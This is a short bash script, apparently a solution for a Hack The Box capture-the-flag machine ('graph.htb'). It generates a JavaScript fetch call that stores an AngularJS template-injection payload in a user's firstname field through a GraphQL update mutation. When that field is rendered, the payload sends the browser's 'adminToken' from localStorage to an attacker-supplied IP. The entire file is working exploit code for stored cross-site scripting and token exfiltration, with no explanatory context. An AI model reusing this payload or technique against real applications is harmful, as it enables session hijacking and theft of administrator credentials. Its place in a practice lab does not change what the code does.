#!/bin/bash

ID=$1
USERNAME=$2
IP=$3

PAYLOAD='{{$on.constructor('"'"'new Image().src=\"http://'"${IP}"'/?token=\"+window.localStorage.getItem(\"adminToken\");'"'"')()}}'
CODE='fetch("http://internal-api.graph.htb/graphql", {
    method: "POST",
    headers: {"Content-Type": "application/json",},
    credentials: "include",
    body: JSON.stringify({"operationName":"update","variables":{"firstname":"'"${PAYLOAD}"'","lastname":"null","id":"'"${ID}"'","newusername":"'"${USERNAME}"'"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n update(\n newusername: $newusername\n id: $id\n firstname: $firstname\n lastname: $lastname\n) {\n username\n email\n id\n firstname\n lastname\n __typename\n}\n}"}),
})'

echo -n "${CODE}"
